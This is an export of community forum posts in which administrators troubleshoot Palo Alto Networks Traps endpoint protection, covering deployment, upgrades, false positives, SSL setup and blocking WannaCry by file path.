631,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
632,176325,tobar,"Hello,Traps its a good choice, I have more than one year, in my opinion is an excellent protection, I'm planning to migrate at 4.x version for the next month.For the false positives use the monitoring mode, then create the rules, once the rules are created believe me the platform works fine.To deploy use a GPO policie.Regards,wtobar",0,09-13-2017,07:28 AM
633,176325,BPry,"@aandrewlong,It's been good for the past few months, without much of an issue. False-Positives are easy enough to correct and build out a policy to allow, and if it's a Wildfire false positive it usually fixes itself.There is a fair bit of tuning that we needed to do in our enviroment, but we need to fine-tune every antivirus solution we deploy so that isn't that big of a deal and was to be expected.",0,09-15-2017,01:06 PM
634,173147,MichaelMelone,"We deployed Traps 4.0.0, 4.0.1, 4.0.2, and 4.0.3 to MacOS machines enrolled in Jamf. We have not run into issues you are discribing since we don't have any custom bash scripts for unix executables.Could you Catelog all of your hashes of your custom executables? Whitelist in hash control?Are you saying you're getting no security alerts from ESM?",0,08-25-2017,12:23 PM
635,173147,ancis,"Since you describe this issues as part of your deployment process, would it be possible to move traps to the end of the deployment (post local system changes)? or set a condition for the install to validate before it proceeds?If part of the image that is deployed to the system, Collecting the Jamf binaries (with path), and support file from the endpoint agent, should help the support team assist with creating the proper rule for your macs and enviorment.",0,08-25-2017,12:41 PM
636,173147,matin.logmein,@MichaelMelone- thanks for the advice. I do not have access to make any changes or see any changes on the ESM in anyway.I have escalated my issue to my internal networking team who manages this product for my company. From what my networking team has relayed to me. The executable does not get evaluated by the ESM and no log of the issue or interaction with the specific client is sent to the ESM so whitelisting in hash control seems impossible unless there is a manual way of doing it. We get no alarms from the client or alerts on ESM from what I am aware of from our networking team.,0,09-12-2017,07:53 PM
637,173147,matin.logmein,"@efrancis- Thanks for the advice. We have moved the installation of Traps for mac to the end of our deployment process. We have escalated the issue, the standalone installer, the script, client logs and server log at the time of installation to PaloAlto Support. It seems they are a little baffled since this has been going on for over a month now.",0,09-12-2017,07:57 PM
638,174855,ancis,"Darshil,I would recommend to open a case with support to manually review the endpoints failure to upgrade. Also, you do not need to install each version, You can install the latest version (4.0.0 to 4.0.4, instead of 4.0.0-->4.0.1-->4.0.2, etc.)",0,09-05-2017,10:01 AM
639,174855,Darshil,"Thanks Efrancis,I have been updating it one by one as new versions were released.I suppose the issue this time(from 4.0.3 -> 4.0.4) is regarding Network as our client has new Firewall deployed in their network. But still there are few user machines on which it has not updated since 4.0.0 was installed. I think contacting Palo Alto support engineers will be a better option.",0,09-05-2017,11:46 PM
640,174855,AriKukkonen,"I have same problem, 4.0.3 is not upgrading to 4.0.42017-09-08 22:09:51.3068 ERROR CyveraService 20 Cyvera.Common.General.Extensions.WebExtensions General ""Failed downloading file https://correcttrapsserver/EndpointSecurityManager/Update/14a852f5-b8f8-448e-bfe6-1e461824d02c/x86/installer?v=4.0.3.27073&os=8, to directory C:\ProgramData\Cyvera\Everyone\Temp\Update_2334 System.Net.WebException: The remote server returned an error: (404) Not Found.",0,09-08-2017,12:35 PM
641,174855,AriKukkonen,"ok, problem solved with these steps:1. created new update action.2. Then extracted the upgrade zip to that folder which was just created underC:\Program Files\Palo Alto Networks\Endpoint Security Manager\Web\Updates3. Then activated the action and no fails happened, just succesful upgrades.",0,09-08-2017,02:00 PM
642,174855,phanson,"Hello,I just upgraded ESM from 3.4.3 to 4.0.4 and setup a rule to upgrade all clients. My action rule has an exclude condition of ""traps 4.0.3 and later releases"". Basically any client NOT on 4.0.3 or higher is getting upgraded. Try adding the exclude condition in your action rule.Patrick",0,09-08-2017,02:55 PM
643,171228,jestrella,"==========2017-08-11 09:30:14.4022 ERROR CyveraService 35 Cyvera.Client.Service.OneTimeActions.Actions.InstallUpdateAction Action Signature validation failed for 'C:\ProgramData\Cyvera\Everyone\Temp\Update_10874\dff2fe1a-dab9-4d3c-ad36-43488ee7486a' package.==========Pleasecheck the OS of the target agents.Due to a support issue with the (sha2) certificates packaged with the installer, you cannot upgrade the Traps agent on Windows XP, Windows Vista, Windows Server 2003, or Windows Server 2008 using an action rule on the ESM Console. Instead, you must use an alternate deployment method, such as SCCM or GPO, to deploy the agent to those endpoints.https://www.paloaltonetworks.com/documentation/34/endpoint/newfeaturesguide/upgradedowngrade-conside...",0,08-11-2017,12:59 AM
644,171228,ThomasG,Hi again.Thanks for the tips. The os version is 10.0.15063 N/A Build 15063. So thats not the fix.,0,08-11-2017,01:29 AM
645,171228,BizBo,"Try this..The issue has been resolved and it was down to the Action rule was not be seen as new, I stopped the services and removed action.json, located inC:\ProgramData\Cyvera\LocalSystem\Data this allowed one endpoint to update.Following discussion with PA support they suggested this query needed to be run on the SQL DB on the ESM. (BACKUP DB FIRST)DBCCCHECKIDENT('OneTimeAction',RESEED,4000)(back up sql first)the re-create the action and endpoints start updating.",0,08-25-2017,01:30 PM
646,172400,MichaelMelone,It seems that installing19-1532 content version only gives benefits for Traps 4.0.3 from looking at the release notes.https://downloads.paloaltonetworks.com/traps/Traps_Content_Release_Notes_-_Version_19-1532.pdf?__gda...,0,08-21-2017,07:42 AM
647,172400,barthmetall,Guess i found it in the Client Logs.Dynamic Updates are cumulative. First 18-501 is applied and then 19-1532.So everything is fine. 🙂,0,08-22-2017,06:17 AM
648,168925,pauloraponi,"Hi,Go to an Endpoint that did not receive the update, open the Console and click in ""Open Log File....""It will show to you the error.Regards,Paulo Raponi",0,07-28-2017,01:09 PM
649,168925,KS,"Hi,Do you have tried restarting endpoints?I experienced a problem that Client Upgrade Action did not work once, and it was resolved when restarting endpoints.By the way, ESM server in my environment is resoluting domain name.At that time, it seemed not to be able to do name resolution properly though DNS server was fine.Because nslookup can receive the IP address correctly, but it was not received in the traps agent logs.Regards,KS",0,07-30-2017,10:14 PM
650,168925,BizBo,"The issue has been resolved and it was down to the Action rule was not be seen as new, I stopped the services and removed action.json, located inC:\ProgramData\Cyvera\LocalSystem\Data this allowed one endpoint to update.Following discussion with PA support they suggested this query needed to be run on the SQL DB on the ESM.DBCCCHECKIDENT('OneTimeAction',RESEED,4000)(back up sql first)the re-create the action and endpoints start updating.",0,08-06-2017,07:18 AM
651,167061,briancaw,"Hi DominikPlease confirm firstwhether or not the following key exists in the registry for the ESM core serverHKLM\Software\Cyvera\Server\Installation Path (REG_SZ)  D:\Program Files\Palo Alto Networks\Endpoint Security Manager\Server\If the above key does not exist, please manually create/add it.Next is, run the MSIEXEC command from a command prompt with the parameter to specify the installation path- open command prompt with admin privilege- from the command prompt, navigate to the location where the Traps installer is located- run the following command:msiexec.exe /iESMCore_x64_4.0.2.26106.msi CYVERAESCFOLDER=""D:\Program Files\Palo Alto Networks\Endpoint Security Manager\"" /L*v install.logMake sure , if you have Traps agent installed on the server, to disable the Service Protection on it.Additional recommendations for the upgrade can be found here:https://www.paloaltonetworks.com/documentation/40/endpoint/newfeaturesguide/upgradedowngrade-conside...",0,07-18-2017,05:32 PM
652,165817,Willian,"Hi@BrettBrownAccording to the compatibility matrix below""Do not upgradeWindows 10 to build 1703 when running Traps 4.0.0; instead, you must first upgrade to Traps 4.0.1 or a later release before you upgrade to Windows 10 1703.""Based on your post, you are running Windows 10x64 1703; hence, the install will not be supported.https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/framemaker/global/compatibility-ma...I hope this helps.",0,07-11-2017,08:16 AM
653,165817,BrettBrown,"I have tried 4.0.1, that was my default. Installing manually works fine, i have it running on a fleet of machines on version 1703. It is only when pushing via GPO it fails with the incompatibility warning.",0,07-11-2017,04:31 PM
654,143146,gafrol,Really no one ..?,0,02-21-2017,08:36 AM
655,143146,GregorySmith,"Is the FP local analysis verdict of the executable being resolved on the back-end once the WF sample analysis is completed?False positives should be resolved in an automated fashion with the sample being uploaded to WF and Analysed. The turn-around time on this would depend on your ESM settings and network connectivity of course.Are you finding you have to manually set as ""Benign"" in Hash Control?",0,03-07-2017,10:14 AM
656,143146,gafrol,"My concern is not about WF analysis, my question is about too many false positives with the local analysis module.I would like to know what your experience is with LA. I was attending the SE Summit in Vegas two weeks ago and it seems I am not the only one feeling some pain with LA...Also the last two recent content updates did not contain an updated (trained) machine learning algorithm for the LA module.",0,03-07-2017,04:02 PM
657,143146,SvenMik,"Hello gafrol,Mainly custom applications will trigger a false positive with LA - which happens at times.I think the whitelisting we have to do is still in an acceptable range.This module is still far from perfect but fills the gap between allowing all WF Unknown files and blocking everything WF has not seen before. At this point we still have to rely on the WF verdict though.I share your concern for the lack of updates in Content Updates.",0,03-27-2017,06:48 AM
658,143146,chsmith,"Hi Roland,Though Local Analysis is built to operate (in part) like the WildFire Cloud does, the resource constraintsinherent in running this on a single Endpoint in conjunction with the static nature of the module mean that certain properties that appear malicious will tend to trigger a prevention event (erring on the side of caution rather than allowing something through).One major goal of Local Analysis is to limit the time that a new process hash is considered ""unknown"" (making this component much more flexible than it was previously, where the only options - when dealing with a new hash, or lack of connectivity to the ESM or WildFire - were to block or allow processes until a WildFire verdict was received).Some of this may be tuneable (depending on your current policy configuration), but I'd recommend reporting these events to Support to investigate (and ensure these events are incorporated into future updates to the Local Analysis model).--Chris",0,04-13-2017,02:40 PM
659,143146,UrosSustar,"We are also experiencing quite a few FP's with Local analysis on weekly basis (almost every day). And our environment isn't even big, only around 80 endpoints. Therefore, we are considering turning it only to notification, since our client's aren't happy with Traps keep on blocking new installations, either when they are offline or the executable is unknown to WF.However, I've noticed that from yesterday, there's new content update available which include new LA algorithm, hencewe'll give it a chance one more time.Regards,Uroš",1,07-07-2017,02:08 AM
660,143146,gafrol,"Ohh woowww, the first content update to the LA Module after months ... finallyLets check it out 🙂",0,07-07-2017,02:14 AM
661,163653,Willian,"HI@kortekeItems in the Global whitelist section take precedence over any blacklisted items and are evaluated first in the security policy. It means, that if you restricted a path in through the restriction policy, and at the same time it is also in the Global Whitelist, the second configuration is the one that will be triggered.If you turn the ""Action"" to Prevention, it means that any path no explicitly whitelisted will be blocked. If you put in notification, any file being executed from a path not explicitly whitelisted, will be notified. You can turn user notification on and off as you know.One of the advantages of using theGlobal whitelist is that it gives you the visibility of which applications are potentially running from non authorized locations or that may potentially be malicious. In this case you have to provide the path for the actual executable. So, in your example, if thee:\testing\*.exe is included in the Global Whitelist, it will take precedence as explained earlier, hence, you cannot have this .exe configured on both sides.If you want to restrict the executable, do not include in the Global Whitelist, and then create a malware restriction policy instead.In order to override the default policy you need to create a user defined policy to apply further restrictions.The malware restriction policy can be configured at the following menu: Policies > Malware >> Restricitions > AddI have some scripts ready that may help you create these policies in the following link.https://www.dropbox.com/sh/0e9e64aj6cxaqqh/AACiUd6I4RVKUbhHhn5IiiTla?dl=0I hope this helps",0,06-29-2017,07:50 AM
662,155029,Willian,"Hi @MichaelMelone, The initial Traps agent installation, has to be performed via one of the following methods: Manually, SCCM, GPO or other software automated install tool. The subsequent upgrades can be done via the ESM console by pushing the upgrade package through the Settings > Agent > Actions > Agent Installation. I hope this helps.",1,05-03-2017,11:26 AM
663,155029,MichaelMelone,Thank you Willian. I wonder if this is on the road map since most other AV/Endpoint Protection vendors offer this kind of initial install.,1,05-03-2017,11:46 AM
664,155029,Willian,,1,05-03-2017,11:57 AM
665,155029,MichaelMelone,We needed it for servers since we dont have SCOM yet but we're getting there. Thanks!,1,05-04-2017,02:09 PM
666,155029,tobar,"Hello,I try to send agent upgrade from ESM, but logon script worked well for me.Regards,",0,06-19-2017,07:16 PM
667,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
668,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
669,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
670,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
671,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
672,161381,Willian,Nice one 🙂Thanks for sharing.,0,06-16-2017,03:23 PM
673,148313,Eduardo_Fdez,"Hi,In Traps 3.4 and earlier, it's not possible to configure an automatic license revocation when an endpoint is not connecting to the ESM for a period of time. You have to do it manually.In Traps 4.0 is possible to configure an automatic license revocation when an endpoint is not connecting to the ESM for a period of time (90 days by default). In earlier versions is not possible, you should do it manually.I hope it helps.Regards !!",2,06-09-2017,03:14 AM
674,158072,mdw189,"We're running Traps 3.X and SEP14 with no compantibility problems. Testing Traps 4 now, and so far no issues.",0,05-24-2017,07:42 AM
675,158072,RobinVarghese,"After installing traps 4 we can't open the outlook, word , excel..... same in version 3 also.No idea what's happening exacts...!!",0,05-24-2017,08:16 AM
676,157875,pauloraponi,"Is your IISBitsUploads configured? Agent use it to send Wildfire samples to ESM.Regards,Paulo Raponi",0,05-23-2017,06:38 AM
677,157578,Willian,"Hi @Alex_GomezThe security policy in question has to allow the application paloalto-trapsand SSL. That's the best way to get it working.Finally, please confirm if the Internal and External FQDNs that your endpoint agents connect are the same and that the DNS resolution is happening correctly.For example:Scenario 1: Internal and External FQDNs are the same i.e esm.acme.com. It then resolves to the internal and external IPs.Scenario 2: Internal and External FQDNs aredifferent i.e esm.int.acme.com and esm.ext.acme.com. it then resolvesto the internal and external IPs.I hope this helps.Will",0,05-21-2017,08:48 PM
678,157578,Alex_Gomez,Hi@WillianI'm usingScenario 2: Internal and External FQDNs aredifferent i.e esm.int.acme.com and esm.ext.acme.com. it then resolvesto the internal and external IPs.I will give that a go..thanks,0,05-21-2017,08:50 PM
679,156916,JasonR,"Just in case, here is the reply from TAC:It looks like Apple is now restricting injection to iTunes completely in their latest update.We will be releasing a content update to address this (same as the policy below) but in the meantime, Please create the condition and policy manually to address this:to create a condition- login to the ESM console- go to Settings -> Conditions -> MacOS- click on the menu/hamburger icon . its a 3 short lines to the left of Rows where you select number or rows to display, then select Add- select Bundle ID for the condition typeName: iTunes > 12.6.0Description: iTunes >12.6.0Bundle ID: com.apple.iTunesversion comparison: Greater thanVersion: 12.6.0- click SaveTo create the policy- go to Policies -> Exploit ->Application Protection Modules -> MacOS- click on the hamburger/menu icon which looks like 3 short horizontal lines to the left of Rows where you select number of rows to displaythen click Add- select Dylib-Hijacking Protection , set Activation to OFF- Select ROP Mitigation, set Activation to OFF- under Processes tab, add itunes to the selected Processes list- under Conditions, add the condition created above to the Include list- name the policy under Name tab then click ApplyOnce the agent checks in, it should have the policy. Confirm if iTunes can now be launched.",1,05-18-2017,12:01 PM
680,156916,MichaelMelone,Right. I got this from support and it Fixed my issue once mac traps agents checked in.This should also be addressed in the next content version.,0,05-19-2017,01:17 PM
681,156796,Willian,"Hi@ESutedy, I am not sure if I understood your question correctly, but seems like you are asking where to configure new processes in the ESM Traps 4.0, for Mac OSX.If that's the case, you need to go into the Policies tab > Process Management > MacOS tab. It will then list all default MacOS processes.In order to add more processes click in the following icon:I hope this helps.Will",0,05-15-2017,11:58 PM
682,156796,ESutedy,"Hi @Willian,I am after the preference list of the Traps settings.For example, for some reason if we need to change the server name or enable/disable SSL, we can use Configuration Profile to set it or run defaults write to override the current settings.Most of the applications have plist where you can modify the App settings according to your environment.Thanks",1,05-16-2017,06:57 PM
683,156487,azman_ansar,"Dear PAN team,How about protection against these newly discovored ransomware family:1. WannaCryhttp://thehackernews.com/2017/05/wannacry-ransomware-unlock.html2. Jaffhttp://thehackernews.com/2017/05/decrypt-jaff-ransomware-files.htmlDoes Palo Alto networks provide protection against this new ransomware?I can't find any signatures of this ransomware in PAN threat vault.TQ",0,05-12-2017,06:59 PM
684,156487,Willian,"@ADias,@azman_ansarTraps will block Wcry or WannaCry using Local Analysis (When there is no connection to ESM) or via WildFire if Connection to ESM is established using only default policies.If you want to put especific restrictions in place you can also create a malware restriction policy (Policies > Malware > Restrictions) to the following file paths:%AppData%\@WanaDecryptor@.exe%AppData%\wanacry.exe%homedrive%\@WanaDecryptor@.exe%homedrive%\wanacry.exe%Local%\@WanaDecryptor@.exe%Local%\wanacry.exe%LocalLow%\@WanaDecryptor@.exe%windows%\wanacry.exe%windows%\@WanaDecryptor@.exe%userprofile%\Desktop\wanacry.exe%userprofile%\Desktop\@WanaDecryptor@.exe%LocalLow%\wanacry.exe*.wncry.@WanaDecryptor@.exewcry.exewanacry.exeFor further information on the IOC paths above:https://otx.alienvault.com/pulse/5916314d827e24047d7007d9/Also, if you don't have it already, I would advise to block executables from running from the following any of the following locations %AppData%,%LocalAppData%,%temp%.Legitimate applications don't typically execute from locations such as%AppData%,%LocalAppData%,%temp% or others. Best practice is to not allow any executables to execute from these locations, as it is a typical malware bahaviour, such as ransomwareA notable behavior used by several Ransomware, including Cryptolocker, is to run its executable from %AppData%, %LocalAppData% or %%temp, and it is no different with WannaCry.Other things you can do is to prevent malicious DLL loading by utilizing DLL Hijacking Protection EPM Background.Some of the recent attacks are using a different attack method – these attacks are loading DLLs (by either using exploits, macros or other scripts) as the delivery method for the malicious code.Traps can block loading DLLs by certain processes from certain locations on the system, and these methods can be utilized to prevent attacks that use malicious DLL loading.InstructionsCreate 2 DLL Hijacking Protection rules:Make sure to change to other attributes (‘No Current Dir Load’, ‘No Remote Load’, ‘No Removable Drive Load’) to off. Changes to ‘Load Exclusions List’ should be made only with help from Palo Alto Networks support.These rules are not a part of Traps 4.0 default policy (under content update 13), since these rules are more prone to creating false events in certain environments. In case these rules are being used, and they are creating false positive events – it is highly recommended to whitelist the folder or DLL being loaded or remove the rule from the associated processI hope this helps.",3,05-12-2017,07:43 PM
685,156487,pauloraponi,"Hi Guys,I've tried Traps 4.0 with default policies and content 14 in a Windows 7 VM andWannaCry .exe sampleTraps blocks successfully WannaCry even without ESM Comunication (without Wildfire, in this case) !So, all Traps customer are safe by default.Regards,Paulo Raponi",2,05-13-2017,06:28 AM
686,156487,mdw189,@pauloraponido you have local wildfire analysis enabled? or which EPMor MPM detected it? Thanks!,0,05-13-2017,10:07 AM
687,156487,pauloraponi,"I've tested with all ESM default policies.I'm disabled my VM (agent) communication with external network. So, Traps are blocking WannaCry using Local Analisys.",2,05-14-2017,02:59 PM
688,155610,Willian,"Prevent malicious DLL loading by utilizing DLL Hijacking Protection EPM BackgroundSome of the recent attacks are using a different attack method – these attacks are loading DLLs (by either using exploits, macros or other scripts) as the delivery method for the malicious code.Traps can block loading DLLs by certain processes from certain locations on the system, and these methods can be utilized to prevent attacks that use malicious DLL loading.InstructionsCreate 2 DLL Hijacking Protection rules:Make sure to change to other attributes (‘No Current Dir Load’, ‘No Remote Load’, ‘No Removable Drive Load’) to off. Changes to ‘Load Exclusions List’ should be made only with help from Palo Alto Networks support.These rules are not a part of Traps 4.0 default policy (under content update 13), since these rules are more prone to creating false events in certain environments. In case these rules are being used, and they are creating false positive events – it is highly recommended to whitelist the folder or DLL being loaded or remove the rule from the associated processI hope it helps.",2,05-11-2017,06:32 PM
689,155610,BruceL,NVM...found the answer:For the XML rules configs; are these importable into the ESM in current XML format?,0,05-13-2017,03:07 PM
690,155334,Willian,"Hi @Alex_Gomez,At the time of a security event, Traps can report the files that were accessed, modules, that were loaded into memory, URIs that were accessed, and ancestor process of the process that triggered the security event. You can define policy rules that specify what is collected; these rules can incorporate conditions, so that different users, computers, or groups receive different settings.Traps captures the following information at the time of a security event:To modify the report collection settings, clone the policy and override the desired details. Overriding the default memory dump size rule allows to reduce the disk space consumed by dumps in the event of a prevention. However, reducing this setting to any value below the default (full) could omit important forensic information.I hope it helps;Willian",0,05-05-2017,05:45 PM
691,155334,Alex_Gomez,"Thanks@Willianfor that response clears it up.I noticed the default Policy does a Full Memory Dump, so i understand now how these files can be large.",1,05-05-2017,09:04 PM
692,155193,Willian,"The following procedure should work fine.In order to take advantage of Panorama 8.0; do the following:If you have a M100 or M500, update the software, and you're good.If you have a Panorama-VM, there is a few more steps:Voilá:https://live.paloaltonetworks.com/t5/Rome-Discussions/Panorama-8-0-How-to-switch-to-the-new-Panorama...I hope it helps.",1,05-04-2017,02:24 PM
693,155193,MichaelMelone,I think i found my issue on step 4 here. Will post back with more info.https://www.paloaltonetworks.com/documentation/80/panorama/panorama_adminguide/monitor-network-activ...,1,05-04-2017,02:25 PM
694,155193,MichaelMelone,"Willian,I have already upgraded Panorama to panorama mode. It seems like port 23001 isnt open on Panorma even though i added the log collector profile and log ingestion profile from the document.https://www.paloaltonetworks.com/documentation/80/panorama/panorama_adminguide/monitor-network-activ...",1,05-04-2017,02:43 PM
695,155193,MichaelMelone,I was able to successfully connect after specifying Traps Ingestion Profile in the default Log Collector Group.,2,05-04-2017,03:05 PM
696,147920,Willian,"If you already have the certificate, follow the procedure below:1.Bind the certificate to the port used for agent-ESM communication (2125 by default)Open CMD {Administrator privileges required} and type:""netsh http add sslcert ipport=0.0.0.0:2125 certhash=CERTIFICATE_HASH_HERE appid={935e55e3-8b9d-4b95-954c-423626f887f9} clientcertnegotiation=enable""Notice:• The certificate hash chould be pasted without any spaces.• Use the command ""netsh http show sslcert"" to verify that the certificate is bound to the port.• If a different port was chosen for agent-ESM communication during the ESM and agent installation, make sure to use that port in all the entries in this article.2. Backupcyveraserver.exe.config file by copying it to another folder.Edit cyveraserver.exe.config (located by default in C:\Program Files\Palo Alto Networks\Endpoint Security Manager\Server):• Change the security mode value from “None” to “Transport” <security mode=""Transport"">• Change http to https in all baseaddress entries:• <add baseAddress=""https://0.0.0.0:2125/CyveraServer/""/>• <add baseAddress=""https://0.0.0.0:2125/CyveraLicensing/""/>• <add baseAddress=""https://0.0.0.0:2125/CyveraStatus/""/>3. Restart ""Endpoint Security Manager service""You can see the entire procedure in the following live community post: live.paloaltonetworks.com/t5/Endpoint-Articles/SSL-configuration-guide/ta-p/77491I hope it helps.",1,04-26-2017,10:21 PM
697,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
698,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
699,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
700,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
701,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
702,137098,mmoshiri,"Hi Jonathan,There is definitely a way to do that. In the ESM Policies tab, select any of the default rules, then use the menu drop-down to selectShow Default Rules.This will show you a list of all the default rules. Then you can click on each one of them to see their settings.What was your second question?",2,01-13-2017,08:29 AM
703,137098,JonathanSnyder,Sweet! Thank you!!!I miswrote that. I only had one question. Thanks again!,0,01-13-2017,08:37 AM
704,137098,RobinVarghese,How to know the default policies of traps 4,0,04-19-2017,07:28 AM
705,145107,mmoshiri,"Hi Ari,You are correct... this isn't the best forum to discuss the issue you're encountering.The best place to post this request (and report the issue) is in the Traps Beta forum.Also, when you repost your request there, please be sure to indicate if the dbkextd process you're referencing is actually malicious or not. From your ESM screenshot, it looks to me that WF hasidentified it as malicious. But your description makes it sound like it might not be (""...what updating Dropbox looks like..."").",0,02-27-2017,10:39 AM
706,145107,AriKukkonen,"ok, yes, dbkextd is not malicious, it's part of Dropbox and just get's launched many times in very short time. Traps detects it's new, unknown hash, because it has just been updated automatically by dropbox.Hard to say if this is a bug, I thought not and therefore put it in this forum. But I will repost it to beta-forum, thanx!",0,02-27-2017,12:32 PM
707,145107,AriKukkonen,"ok, yes, dbkextd is not malicious, it's part of Dropbox and just get's launched many times in very short time. Traps detects it's new, unknown hash, because it has just been updated automatically by dropbox.Hard to say if this is a bug, I thought not and therefore put it in this forum. But I will repost it to beta-forum, thanx!",0,02-27-2017,12:32 PM
708,141967,ancis,"You can upgrade to the latest version without the need to install the versions in between (your current, and latest available 3.4.3) ESM Core and Console need same version installed.The old version endpoint will check with the latest version ESM (Core and Console should always be current or above what Endpoint agents are running) but will be limited features available in that version. Until updated to the latest version, at which point the Traps agents will be able to use all features of the current version.",1,02-08-2017,11:11 AM
709,139370,mmoshiri,"I suspect whitelisting ccmexec.exe won't achieve the goal you have in mind. That will allow that particular application to run, but depending on your policies (execution restrictions), Traps may block the execution from Temp folders.Ultimately, you are looking to whitelist the corporate apps that will be running, not ccmexed.exe, right?Here are a fewofsuggestions:Keep in mind that the Execution Restrictions are always checked, regardless of whichother malware prevention methods are invoked. So be sure to verify these restrictions match what you're looking to set up.",0,01-26-2017,11:13 AM
710,132854,mmoshiri,"Hi Jimmy,Thanks for the question.Traps does not load exploit samples to WildFire (the way our NGFWs can/do).The exploit prevention capabilities of Traps (EPMs) are injected into each process as it starts (Word, in this case) and detect and block expoitation attempts on the spot. If Traps identified a Word doc as the source of an exploitation attempt, it is safe to assume that it is a weaponized file... or one that was manipulated in some way that triggered an EPM.The record of the exploitation prevention in the ESM backend will tell you what EPM was triggered. And it will give you some additional information about the event as well.",0,12-14-2016,12:01 PM
711,132854,jimmy.gonzalez,"When you say ""The record of the exploitation prevention in the ESM backend will tell you what EPM was triggered. And it will give you some additional information about the event as well."".So you mean in the ESM console going to the Security Events tab, then going to ""Exploits"" under the ""Notifications"" section?",0,12-14-2016,12:16 PM
712,132854,mmoshiri,"Yes... but under the ""Preventions"" tab, like the image attached.",0,12-14-2016,12:25 PM
713,132854,jimmy.gonzalez,"We are actually in ""learning"" mode, so this wasnt prevented, but just a notification. But I was looking at the same screen. Thanks.",0,12-14-2016,12:27 PM
714,132854,mmoshiri,Oh yes... you did say that. My mistake... so you're on the right track.,0,12-14-2016,12:28 PM
715,132854,hayun,"Adding to what Michael already mentioned, the UI provides some visibilty to the event information, but not a complete one. Upon prevention, the agent also create a memory dump of the exploitedprocess and that dump can be retrived from the ESM (using the ""retrive data"" button in the security event details) and can be analyzed to better understand the exploitation attempt. Our Support team can also assist with analyzing the event and providing next steps.",0,12-15-2016,07:36 AM
716,132854,jimmy.gonzalez,"Thanks, thats more or less what I was after. It looks like the retrieve data creates a rule, and then I would retreive the data from the ""Monitor"", ""Data Retrieval""?",0,12-15-2016,08:43 AM
